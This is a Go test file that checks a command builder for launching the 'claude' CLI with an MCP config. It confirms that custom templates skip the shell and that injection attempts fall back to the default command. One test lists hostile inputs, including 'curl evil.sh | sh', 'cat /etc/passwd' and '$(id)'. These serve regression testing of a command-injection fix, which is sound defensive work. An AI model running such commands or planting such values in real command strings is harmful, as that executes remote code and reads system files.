package engine

import (
	"path/filepath"
	"strings"
	"testing"
)

func TestDefaultScoutCommandDoesNotUseShell(t *testing.T) {
	cfgPath := "/tmp/repo with spaces/.knowledge/local/scout-mcp-job.json"
	cmd := scoutCommand("", cfgPath)
	if filepath.Base(cmd.Path) != "claude" {
		t.Fatalf("default scout command path = %q, want claude", cmd.Path)
	}
	got := strings.Join(cmd.Args, "\x00")
	for _, want := range []string{"--mcp-config", cfgPath, "--strict-mcp-config", "--allowedTools", "mcp__knowledge__*"} {
		if !strings.Contains(got, want) {
			t.Fatalf("default scout args missing %q: %#v", want, cmd.Args)
		}
	}
	for _, arg := range cmd.Args {
		if strings.Contains(arg, " ") && arg != cfgPath {
			t.Fatalf("unexpected shell-like joined arg %q in %#v", arg, cmd.Args)
		}
	}
}

// R29-S1.1 P0 命令注入修复回归:自定义 scout_command 不再走 sh -c,
// 而是切词后 exec.Command(argv...),{mcp} 作为独立 argv 元素替换(含空格路径安全)。
func TestCustomScoutCommandNoShellDirectArgv(t *testing.T) {
	cfgPath := "/tmp/repo with spaces/.knowledge/local/scout-mcp-job.json"
	cmd := scoutCommand("helper --flag --mcp-config {mcp}", cfgPath)
	// 不许出现 sh -c
	if filepath.Base(cmd.Path) == "sh" {
		t.Fatalf("P0 回归:自定义 scout_command 仍走 sh -c,有命令注入风险: %#v", cmd.Args)
	}
	if filepath.Base(cmd.Path) != "helper" {
		t.Fatalf("custom scout command path = %q, want helper", cmd.Path)
	}
	wantArgs := []string{"helper", "--flag", "--mcp-config", cfgPath}
	if len(cmd.Args) != len(wantArgs) {
		t.Fatalf("argv 数不对: got %#v want %#v", cmd.Args, wantArgs)
	}
	for i, want := range wantArgs {
		if cmd.Args[i] != want {
			t.Fatalf("argv[%d] = %q want %q (full: %#v)", i, cmd.Args[i], want, cmd.Args)
		}
	}
}

// R29-S1.1:含 shell 元字符的 scout_command 一律拒绝,回退默认 claude 命令(防注入)。
func TestScoutCommandRejectsShellMetacharacters(t *testing.T) {
	injections := []string{
		"claude; curl evil.sh | sh # {mcp}",
		"claude && cat /etc/passwd",
		"claude | tee leak",
		"claude `whoami`",
		"claude $(id)",
		"claude\necho pwned",
	}
	for _, inj := range injections {
		cmd := scoutCommand(inj, "/tmp/cfg.json")
		if filepath.Base(cmd.Path) != "claude" {
			t.Fatalf("注入模板 %q 应回退默认 claude 命令,实际 path=%q args=%#v", inj, cmd.Path, cmd.Args)
		}
	}
}

// R29-S1.1:空/纯空白 configured 走默认命令。
func TestScoutCommandEmptyFallsBack(t *testing.T) {
	for _, in := range []string{"", "   ", "\t\n"} {
		cmd := scoutCommand(in, "/tmp/cfg.json")
		if filepath.Base(cmd.Path) != "claude" {
			t.Fatalf("空 configured(%q) 应回退默认, got path=%q", in, cmd.Path)
		}
	}
}
